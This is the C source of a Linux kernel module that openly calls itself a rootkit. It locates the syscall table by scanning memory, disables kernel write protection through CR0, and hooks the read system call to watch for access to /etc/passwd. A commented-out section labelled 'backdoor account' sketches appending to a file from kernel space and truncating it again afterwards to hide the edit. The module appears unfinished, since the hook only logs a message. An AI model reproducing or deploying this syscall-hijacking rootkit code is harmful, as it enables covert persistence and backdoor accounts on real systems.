#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage int (*o_read)(int fd, void* buf, size_t count);

psize *sys_call_table;

psize **find(void) {

	psize **sctable;
	psize i = START_CHECK;

	while (i < END_CHECK) {

		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
		i += sizeof(void *);
	}

	return NULL;
}

// backdoor account
// ================

/*

struct file *f;
    const char* text_to_add = "Text to add...";

    printk(KERN_INFO "My module is loaded\n");

    f = filp_open("test.txt", O_WRONLY | O_APPEND, 0);

    if(f == NULL) printk(KERN_ALERT "filp_open error!!.\n");

    else{

        fs = get_fs();
        set_fs(get_ds());

	original_end = f->f_pos;
	vfs_write(f, text_to_add, 8, &f->f_pos);

        set_fs(fs);
    }

    filp_close(f,NULL);

=======================================

fs = get_fs();
    set_fs(get_ds());

    vfs_truncate("test.txt", original_end);
    set_fs(fs);

*/

asmlinkage int backdoor_read(int fd, void* buf, size_t count) {

	int ret = (*o_read)(fd, buf, count);

	struct file* file = fcheck(fd);
	struct path* path = &file->f_path;
	path_get(path);
	char* tmp = (char *)__get_free_page(GFP_KERNEL);

	if (!tmp) {

		path_put(path);
		printk(KERN_ERR "could not create tmp\n");
		return ret;
	}

	char* pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);

	if (IS_ERR(pathname)) {

		free_page((unsigned long)tmp);
		printk(KERN_ERR "invalid pathname\n");
		return ret;
	}

	if (strcmp(pathname, "/etc/passwd") == 0) printk("we did it baby\n");

	free_page((unsigned long)tmp);

	return ret;
}

void add_backdoor() {
	
	write_cr0(read_cr0() & (~ 0x10000));
	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
	write_cr0(read_cr0() | 0x10000);
}

void remove_backdoor() {

	write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_read],o_read);
	write_cr0(read_cr0() | 0x10000);
}

int init_module(void) {
    	
	if ((sys_call_table = (psize *) find())) {
		printk("sys_call_table found at %p\n", sys_call_table);
	}
	
	else {
		printk("sys_call_table not found, aborting\n");
		return 1;
	}

	add_backdoor();
    
	printk(KERN_INFO "rootkit loaded\n");	
	return 0;
}

void cleanup_module(void) {

	remove_backdoor();

	printk(KERN_INFO "rootkit unloaded\n");
}
